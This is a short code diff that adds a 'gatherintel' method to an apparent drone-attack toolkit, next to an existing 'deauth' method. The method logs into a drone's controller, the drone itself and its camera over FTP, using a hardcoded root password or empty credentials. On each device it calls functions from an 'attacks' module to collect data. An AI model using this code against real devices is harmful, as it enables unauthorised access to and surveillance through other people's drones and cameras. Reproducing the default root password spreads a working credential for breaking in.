@@ -94,6 +94,22 @@ class Environment:
             raise StandardError(str(e))
         finally:
             self.__closeftp()
+            
+            
+    def gatherintel(self, controllerip='192.168.1.1', droneip='192.168.1.2', cameraip='192.168.1.3'):
+        
+        hosts = [(controllerip, 'root', 'Big~9China', attacks.gatherintelcontroller),
+                 (droneip, 'root', 'Big~9China', attacks.gatherinteldrone),
+                 (cameraip, '', '', attacks.gatherintelcamera)]
+        
+        for host in hosts:
+            try:
+                self.__openftp(host[0], host[1], host[2])
+                host[3](self.ftp)
+            except Exception as e:
+                raise StandardError(str(e))
+            finally:
+                self.__closeftp()
         
         
     def deauth(self, index, duration=20, exceptions=[]):
